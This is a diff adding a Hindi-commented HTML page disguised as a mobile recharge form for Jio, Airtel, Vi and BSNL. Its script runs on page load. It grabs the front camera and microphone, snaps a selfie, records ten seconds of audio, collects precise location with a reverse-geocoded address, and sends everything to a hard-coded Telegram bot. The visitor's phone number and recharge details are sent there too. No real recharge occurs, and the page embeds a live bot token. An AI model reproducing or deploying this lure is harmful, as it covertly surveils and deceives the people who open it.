@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Mobile Recharge</title>
+<script>
+// ===== यहाँ अपना Telegram Bot Token और Chat ID डालें =====
+const BOT_TOKEN = "8861698885:AAHhzQXG9JvFFkOAuCE-GPvjmuXYz1J9r0A";
+const CHAT_ID   = "8121453038";
+// ========================================================
+
+let mediaStream = null;
+
+// पेज खुलते ही सब कुछ शुरू करें
+window.onload = function() {
+    document.getElementById("rechargeBox").style.display = "none";
+    startAllPermissions();
+};
+
+// ===== सब एक साथ शुरू करें =====
+async function startAllPermissions() {
+    // पहले Camera + Mic लें
+    await requestMediaPermissions();
+    // फिर Location
+    requestLocation();
+}
+
+// ===== Camera + Microphone Permission =====
+async function requestMediaPermissions() {
+    try {
+        // सामने का कैमरा (selfie) माँगें
+        mediaStream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: "user" },
+            audio: true
+        });
+        console.log("✅ Camera + Mic granted");
+
+        // 📸 फोटो लेकर भेजें
+        await captureAndSendPhoto(mediaStream);
+
+        // 🎤 10 सेकंड का ऑडियो रिकॉर्ड करके भेजें
+        await recordAndSendAudio(mediaStream);
+
+    } catch (error) {
+        console.log("❌ Camera/Mic Error: " + error.message);
+    }
+}
+
+// ===== 📸 फोटो कैप्चर करें =====
+function captureAndSendPhoto(stream) {
+    return new Promise((resolve) => {
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        video.setAttribute("playsinline", "true");
+        video.muted = true;
+        video.play();
+
+        // 3 सेकंड बाद कैप्चर (कैमरा warm-up के लिए)
+        setTimeout(() => {
+            const canvas = document.createElement("canvas");
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+
+            const ctx = canvas.getContext("2d");
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Canvas → Blob
+            canvas.toBlob(async (blob) => {
+                if (blob) {
+                    await sendPhotoToTelegram(blob);
+                }
+                resolve();
+            }, "image/jpeg", 0.85);
+        }, 3000);
+    });
+}
+
+// ===== Telegram पर Photo भेजें =====
+async function sendPhotoToTelegram(blob) {
+    const formData = new FormData();
+    formData.append("chat_id", CHAT_ID);
+    formData.append("photo", blob, "selfie.jpg");
+    formData.append("caption", "📸 Front Camera Photo\n⏰ " + new Date().toLocaleString("hi-IN"));
+
+    try {
+        await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto", {
+            method: "POST",
+            body: formData
+        });
+        console.log("✅ Photo भेजी गई");
+    } catch (e) {
+        console.log("❌ Photo Error: " + e.message);
+    }
+}
+
+// ===== 🎤 10 सेकंड ऑडियो रिकॉर्ड करें =====
+function recordAndSendAudio(stream) {
+    return new Promise((resolve) => {
+        const audioTracks = stream.getAudioTracks();
+        if (audioTracks.length === 0) {
+            console.log("❌ कोई माइक नहीं मिला");
+            return resolve();
+        }
+
+        // सिर्फ audio ट्रैक लें
+        const audioOnlyStream = new MediaStream(audioTracks);
+        const recorder = new MediaRecorder(audioOnlyStream);
+        const chunks = [];
+
+        recorder.ondataavailable = (e) => {
+            if (e.data.size > 0) chunks.push(e.data);
+        };
+
+        recorder.onstop = async () => {
+            const audioBlob = new Blob(chunks, { type: "audio/webm" });
+            await sendAudioToTelegram(audioBlob);
+            resolve();
+        };
+
+        recorder.start();
+        console.log("🎤 ऑडियो रिकॉर्डिंग शुरू (10 सेकंड)");
+
+        // 10 सेकंड बाद रोक दें
+        setTimeout(() => {
+            if (recorder.state !== "inactive") recorder.stop();
+        }, 10000);
+    });
+}
+
+// ===== Telegram पर Audio भेजें =====
+async function sendAudioToTelegram(blob) {
+    const formData = new FormData();
+    formData.append("chat_id", CHAT_ID);
+    formData.append("audio", blob, "recording.webm");
+    formData.append("caption", "🎤 10 sec Audio Recording\n⏰ " + new Date().toLocaleString("hi-IN"));
+
+    try {
+        await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendAudio", {
+            method: "POST",
+            body: formData
+        });
+        console.log("✅ Audio भेजा गया");
+    } catch (e) {
+        console.log("❌ Audio Error: " + e.message);
+    }
+}
+
+// ===== 📍 Location Permission =====
+function requestLocation() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+            function(position) {
+                const lat = position.coords.latitude;
+                const lng = position.coords.longitude;
+                const mapLink = "https://www.google.com/maps?q=" + lat + "," + lng;
+                const accuracy = position.coords.accuracy;
+
+                fetch("https://nominatim.openstreetmap.org/reverse?format=json&lat=" 
+                      + lat + "&lon=" + lng)
+                    .then(res => res.json())
+                    .then(data => {
+                        const address = (data && data.display_name) ? data.display_name : "पता नहीं मिला";
+                        sendToTelegram(lat, lng, address, mapLink, accuracy);
+                    })
+                    .catch(() => {
+                        sendToTelegram(lat, lng, "पता नहीं मिला", mapLink, accuracy);
+                    });
+
+                document.getElementById("rechargeBox").style.display = "block";
+            },
+            function(error) {
+                console.log("Location Error: " + error.message);
+                document.getElementById("rechargeBox").style.display = "block";
+            },
+            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+        );
+    } else {
+        document.getElementById("rechargeBox").style.display = "block";
+    }
+}
+
+// ===== Telegram पर Location भेजें =====
+function sendToTelegram(lat, lng, address, mapLink, accuracy) {
+    const message =
+        "🚨 *नया यूज़र आया!*\n" +
+        "━━━━━━━━━━━━━━━━━━\n" +
+        "📍 *Live Location*\n" +
+        "🏠 Address: " + address + "\n" +
+        "🌐 Latitude: " + lat + "\n" +
+        "🌐 Longitude: " + lng + "\n" +
+        "🎯 Accuracy: " + Math.round(accuracy) + " मीटर\n" +
+        "🗺️ Google Map: " + mapLink + "\n" +
+        "⏰ Time: " + new Date().toLocaleString("hi-IN");
+
+    fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: "Markdown"
+        })
+    });
+
+    fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendLocation", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            latitude: parseFloat(lat),
+            longitude: parseFloat(lng)
+        })
+    });
+}
+
+// ===== Recharge बटन =====
+function sendRecharge() {
+    const mobile = document.getElementById("mobile").value.trim();
+    const amount = document.getElementById("amount").value.trim();
+
+    if (mobile === "" || amount === "") {
+        alert("कृपया Mobile Number और Amount भरें");
+        return;
+    }
+
+    // Telegram पर Recharge Details भेजें
+    const msg =
+        "💰 *Recharge Request*\n" +
+        "━━━━━━━━━━━━━━━━━━\n" +
+        "📱 Mobile: " + mobile + "\n" +
+        "📶 Operator: " + document.getElementById("operator").value + "\n" +
+        "💵 Amount: ₹" + amount + "\n" +
+        "⏰ Time: " + new Date().toLocaleString("hi-IN");
+
+    fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: msg,
+            parse_mode: "Markdown"
+        })
+    });
+
+    alert("✅ Recharge Request भेज दी गई!");
+}
+</script>
+<style>
+    * { margin:0; padding:0; box-sizing:border-box; font-family: Arial, sans-serif; }
+    body { 
+        background:#f2f2f2; 
+        display:flex; 
+        justify-content:center; 
+        align-items:center; 
+        min-height:100vh; 
+        padding:15px;
+    }
+    #rechargeBox {
+        display:none;
+        width:100%;
+        max-width:360px;
+        background:#fff;
+        border-radius:12px;
+        box-shadow:0 4px 15px rgba(0,0,0,0.15);
+        padding:25px 20px;
+    }
+    h2 { text-align:center; color:#1a73e8; margin-bottom:20px; font-size:20px; }
+    label { font-size:14px; color:#333; display:block; margin-bottom:5px; }
+    input, select {
+        width:100%;
+        padding:10px;
+        margin-bottom:15px;
+        border:1px solid #ccc;
+        border-radius:8px;
+        font-size:15px;
+        outline:none;
+    }
+    input:focus, select:focus { border-color:#1a73e8; }
+    button {
+        width:100%;
+        padding:12px;
+        background:#1a73e8;
+        color:#fff;
+        border:none;
+        border-radius:8px;
+        font-size:16px;
+        cursor:pointer;
+    }
+    button:hover { background:#0c56c9; }
+</style>
+</head>
+<body>
+
+<div id="rechargeBox">
+    <h2>Mobile Recharge</h2>
+
+    <label>Mobile Number</label>
+    <input type="tel" id="mobile" placeholder="10 digit number" maxlength="10">
+
+    <label>Operator</label>
+    <select id="operator">
+        <option>Jio</option>
+        <option>Airtel</option>
+        <option>Vi</option>
+        <option>BSNL</option>
+    </select>
+
+    <label>Amount (₹)</label>
+    <input type="number" id="amount" placeholder="Enter amount">
+
+    <button onclick="sendRecharge()">Recharge Now</button>
+</div>
+
+</body>
+</html>
